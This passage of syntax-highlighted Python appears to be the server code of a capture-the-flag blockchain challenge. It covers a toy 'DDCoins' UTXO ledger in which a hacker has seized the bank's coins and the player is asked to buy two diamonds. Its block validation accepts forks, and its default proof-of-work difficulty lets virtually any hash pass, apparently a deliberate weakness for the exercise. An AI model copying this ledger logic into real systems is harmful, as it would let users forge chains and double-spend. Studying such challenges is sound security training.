+        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create_tx</span><span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> output_utxo<span class="token punctuation">,</span> privkey_from<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    tx <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'input'</span><span class="token punctuation">:</span> input_utxo_ids<span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>sign_input_utxo<span class="token punctuation">(</span>id<span class="token punctuation">,</span> privkey_from<span class="token punctuation">)</span> <span class="token keyword">for</span> id <span class="token keyword">in</span> input_utxo_ids<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> output_utxo<span class="token punctuation">}</span>
+    tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> tx
+
+<span class="token keyword">def</span> <span class="token function">hash_block</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create_block</span><span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">,</span> nonce_str<span class="token punctuation">,</span> transactions<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> type<span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'prev_block_hash should be hex-encoded hash value'</span><span class="token punctuation">)</span>
+    nonce <span class="token operator">=</span> str<span class="token punctuation">(</span>nonce_str<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'the nonce is too long'</span><span class="token punctuation">)</span>
+    block <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'prev'</span><span class="token punctuation">:</span> prev_block_hash<span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">:</span> nonce<span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">:</span> transactions<span class="token punctuation">}</span>
+    block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_block<span class="token punctuation">(</span>block<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> block
+
+<span class="token keyword">def</span> <span class="token function">find_blockchain_tail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> max<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> block<span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">calculate_utxo</span><span class="token punctuation">(</span>blockchain_tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    curr_block <span class="token operator">=</span> blockchain_tail
+    blockchain <span class="token operator">=</span> <span class="token punctuation">[</span>curr_block<span class="token punctuation">]</span>
+    <span class="token keyword">while</span> curr_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        curr_block <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>curr_block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+        blockchain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curr_block<span class="token punctuation">)</span>
+    blockchain <span class="token operator">=</span> blockchain<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+    utxos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">for</span> block <span class="token keyword">in</span> blockchain<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> input_utxo_id <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>input_utxo_id<span class="token punctuation">]</span>
+            <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                utxos<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> utxo
+    <span class="token keyword">return</span> utxos
+
+<span class="token keyword">def</span> <span class="token function">calculate_balance</span><span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    balance <span class="token operator">=</span> <span class="token punctuation">{</span>bank_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> hacker_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> shop_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>
+    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> balance<span class="token punctuation">:</span>
+            balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+        balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> balance
+
+<span class="token keyword">def</span> <span class="token function">verify_utxo_signature</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">append_block</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> difficulty<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    has_attrs<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown parent block"</span><span class="token punctuation">)</span>
+    tail <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please put a transaction array in the block'</span><span class="token punctuation">)</span>
+    new_utxo_ids <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        has_attrs<span class="token punctuation">(</span>tx<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            has_attrs<span class="token punctuation">(</span>utxo<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of output utxo"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> new_utxo_ids<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"output utxo of same id({}) already exists."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            new_utxo_ids<span class="token punctuation">.</span>add<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of amount of output utxo"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid amount of output utxo"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of address of output utxo"</span><span class="token punctuation">)</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                addr_to_pubkey<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">except</span><span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid type of address({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
+        tot_output <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo ids in tx should be array"</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo signatures in tx should be array"</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"lengths of arrays of ids and signatures of input utxos should be the same"</span><span class="token punctuation">)</span>
+        tot_input <span class="token operator">=</span> <span class="token number">0</span>
+        tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+        tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> utxo_id<span class="token punctuation">,</span> signature <span class="token keyword">in</span> zip<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of input utxo"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> utxo_id <span class="token operator">not</span> <span class="token keyword">in</span> utxos<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid id of input utxo. Input utxo({}) does not exist or it has been consumed."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            utxo <span class="token operator">=</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
+            <span class="token keyword">if</span> type<span class="token punctuation">(</span>signature<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of signature of input utxo"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token operator">not</span> verify_utxo_signature<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Signature of input utxo is not valid. You are not the owner of this input utxo({})!"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            tot_input <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
+            <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
+        <span class="token keyword">if</span> tot_output <span class="token operator">></span> tot_input<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"You don't have enough amount of DDCoins in the input utxo! {}/{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tot_input<span class="token punctuation">,</span> tot_output<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
+
+    block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    block_hash <span class="token operator">=</span> int<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> block_hash <span class="token operator">></span> difficulty<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please provide a valid Proof-of-Work'</span><span class="token punctuation">)</span>
+    block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> tail<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'The blockchain is too long. Use ./reset to reset the blockchain'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'A same block is already in the blockchain'</span><span class="token punctuation">)</span>
+    session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> block
+    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>
+
+<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+        <span class="token comment" spellcheck="true"># First, the bank issued some DDCoins ...</span>
+        total_currency_issued <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
+        genesis_transaction <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create DDCoins from nothing</span>
+        genesis_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>EMPTY_HASH<span class="token punctuation">,</span> <span class="token string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>genesis_transaction<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span>
+        genesis_block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block
+
+        <span class="token comment" spellcheck="true"># Then, the bank was hacked by the hacker ...</span>
+        handout <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>hacker_address<span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>
+        reserved <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+        transferred <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>handout<span class="token punctuation">,</span> reserved<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
+        second_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'HAHA, I AM THE BANK NOW!'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        append_block<span class="token punctuation">(</span>second_block<span class="token punctuation">)</span>
+
+        <span class="token comment" spellcheck="true"># Can you buy 2 diamonds using all DDCoins?</span>
+        third_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>second_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'a empty block'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        append_block<span class="token punctuation">(</span>third_block<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_balance_of_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    tail <span class="token operator">=</span> find_blockchain_tail<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> calculate_balance<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>
